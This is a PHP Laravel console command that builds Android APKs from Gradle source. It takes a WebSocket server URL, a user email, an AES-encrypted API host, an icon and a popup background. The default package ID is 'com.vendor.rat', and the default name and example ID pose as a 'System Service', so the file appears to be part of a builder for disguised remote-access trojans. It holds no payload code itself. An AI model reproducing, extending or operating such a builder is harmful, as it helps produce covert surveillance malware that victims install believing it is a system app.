<?php

declare(strict_types=1);

namespace App\Console\Commands;

use App\Exceptions\GradleApkBuilder\GradleApkBuildException;
use App\Services\ApkBuilder\ApkBuildResult;
use App\Services\GradleApkBuilder\GradleApkBuildConfig;
use App\Services\GradleApkBuilder\GradleApkBuilder;
use Illuminate\Console\Command;

class BuildGradleApkCommand extends Command
{
    protected $signature = 'apk:build-gradle
        {--app-name= : 应用显示名称}
        {--websocket-url= : WebSocket 地址 (ws:// 或 wss://)}
        {--user-email= : 用户邮箱}
        {--application-id=com.vendor.rat : 包名 (如 com.system.service)}
        {--version-name=1.0.0 : 版本号 (如 1.0.0)}
        {--version-code=1 : 版本代码 (整数)}
        {--server-host= : API 服务器地址 (AES 加密写入)}
        {--icon= : 自定义图标路径 (PNG)}
        {--background= : 引导弹窗背景图路径 (PNG)}
        {--debug=1 : 调试模式 (1=开启, 0=关闭)}
        {--config= : JSON 配置文件路径 (覆盖所有命令行参数)}';

    protected $description = '使用 Gradle 源码构建 APK (assembleDebug)';

    public function handle(GradleApkBuilder $builder): int
    {
        $this->info('');
        $this->info('╔════════════════════════════════════════╗');
        $this->info('║     Gradle APK Builder (源码构建)       ║');
        $this->info('╚════════════════════════════════════════╝');
        $this->info('');

        $config = $this->buildConfig();

        if (! $config) {
            return self::FAILURE;
        }

        $errors = $config->validate();
        if (! empty($errors)) {
            $this->error('配置验证失败:');
            foreach ($errors as $error) {
                $this->line("  - {$error}");
            }

            return self::FAILURE;
        }

        $this->displayConfig($config);

        if (! $this->confirm('确认开始构建?', true)) {
            $this->warn('构建已取消');

            return self::SUCCESS;
        }

        $this->newLine();

        $stepCount = count(GradleApkBuilder::STEP_LABELS);
        $progressBar = $this->output->createProgressBar($stepCount);
        $progressBar->setFormat(' %current%/%max% [%bar%] %percent:3s%% %message%');
        $progressBar->setMessage('初始化...');
        $progressBar->start();

        $builder->onProgress(function (string $step, string $label, string $status) use ($progressBar) {
            if ($status === 'running') {
                $progressBar->setMessage($label . '...');
            } elseif ($status === 'done') {
                $progressBar->advance();
            }
        });

        try {
            $result = $builder->build($config);

            $progressBar->setMessage('完成');
            $progressBar->finish();
            $this->newLine(2);

            $this->displaySuccess($result);

            return self::SUCCESS;
        } catch (GradleApkBuildException $e) {
            $progressBar->setMessage('失败');
            $progressBar->finish();
            $this->newLine(2);

            $this->displayError($e);

            return self::FAILURE;
        }
    }

    private function buildConfig(): ?GradleApkBuildConfig
    {
        $configFile = $this->option('config');

        if ($configFile) {
            return $this->loadConfigFromFile($configFile);
        }

        return $this->buildConfigFromOptions();
    }

    private function loadConfigFromFile(string $path): ?GradleApkBuildConfig
    {
        if (! file_exists($path)) {
            $this->error("配置文件不存在: {$path}");

            return null;
        }

        $json = file_get_contents($path);
        $data = json_decode($json, true);

        if (json_last_error() !== JSON_ERROR_NONE) {
            $this->error('配置文件 JSON 格式错误: ' . json_last_error_msg());

            return null;
        }

        // 键名兼容: kebab-case → snake_case (如 app-name → app_name)
        $normalized = [];
        $aliases = [
            'icon' => 'icon_path',
            'background' => 'background_path',
        ];
        foreach ($data as $key => $value) {
            $snakeKey = str_replace('-', '_', $key);
            $snakeKey = $aliases[$snakeKey] ?? $snakeKey;
            $normalized[$snakeKey] = $value;
        }

        // 路径解析: /storage/xxx → storage/app/public/xxx (Laravel public disk)
        foreach (['icon_path', 'background_path'] as $pathKey) {
            if (! empty($normalized[$pathKey]) && str_starts_with($normalized[$pathKey], '/storage/')) {
                $relativePath = substr($normalized[$pathKey], strlen('/storage/'));
                $normalized[$pathKey] = storage_path('app/public/' . $relativePath);
            }
        }

        return GradleApkBuildConfig::fromArray($normalized);
    }

    private function buildConfigFromOptions(): GradleApkBuildConfig
    {
        $appName = $this->option('app-name') ?: $this->ask('请输入应用名称', '系统服务');
        $websocketUrl = $this->option('websocket-url') ?: $this->ask('请输入 WebSocket 地址', config('apk-builder.defaults.websocket_url', 'ws://localhost:8081'));
        $userEmail = $this->option('user-email') ?: $this->ask('请输入用户邮箱');

        return GradleApkBuildConfig::fromArray([
            'app_name' => $appName,
            'websocket_url' => $websocketUrl,
            'user_email' => $userEmail,
            'application_id' => $this->option('application-id'),
            'version_name' => $this->option('version-name'),
            'version_code' => (int) $this->option('version-code'),
            'server_host' => $this->option('server-host') ?? '',
            'icon_path' => $this->option('icon') ?? '',
            'background_path' => $this->option('background') ?? '',
            'debug' => (int) $this->option('debug'),
        ]);
    }

    private function displayConfig(GradleApkBuildConfig $config): void
    {
        $this->info('构建配置:');
        $rows = [
            ['应用名称', $config->appName],
            ['包名', $config->applicationId],
            ['版本号', "{$config->versionName} ({$config->versionCode})"],
            ['WebSocket', $config->websocketUrl],
            ['用户邮箱', $config->userEmail],
        ];

        if (! empty($config->serverHost)) {
            $rows[] = ['API 服务器', $config->serverHost];
        }

        $rows[] = ['图标', $config->iconPath ?: '(默认)'];
        $rows[] = ['背景图', $config->backgroundPath ?: '(默认)'];
        $rows[] = ['调试模式', $config->debug ? '开启' : '关闭'];

        $this->table(['参数', '值'], $rows);
    }

    private function displaySuccess(ApkBuildResult $result): void
    {
        $this->info('╔════════════════════════════════════════╗');
        $this->info('║            构建成功!                    ║');
        $this->info('╚════════════════════════════════════════╝');
        $this->newLine();

        $this->table(
            ['项目', '值'],
            [
                ['包名', $result->packageName],
                ['输出路径', $result->path],
                ['总耗时', $result->formatTime()],
            ]
        );

        if (! empty($result->stats)) {
            $this->newLine();
            $this->info('构建步骤:');
            $rows = [];
            foreach ($result->stats as $step => $stat) {
                $label = $stat['label'] ?? $step;
                $status = $stat['status'] ?? 'unknown';
                $timeMs = $stat['time_ms'] ?? 0;
                $rows[] = [$label, $status === 'done' ? 'OK' : $status, $result->formatTime($timeMs)];
            }
            $this->table(['步骤', '状态', '耗时'], $rows);
        }
    }

    private function displayError(GradleApkBuildException $e): void
    {
        $this->error('╔════════════════════════════════════════╗');
        $this->error('║            构建失败!                    ║');
        $this->error('╚════════════════════════════════════════╝');
        $this->newLine();
        $this->error("步骤: {$e->step}");
        $this->error("错误: {$e->getMessage()}");

        if (! empty($e->buildOutput)) {
            $this->newLine();
            $this->warn('构建日志 (最后 20 行):');
            $lines = explode("\n", $e->buildOutput);
            $lastLines = array_slice($lines, -20);
            foreach ($lastLines as $line) {
                $this->line("  {$line}");
            }
        }
    }
}
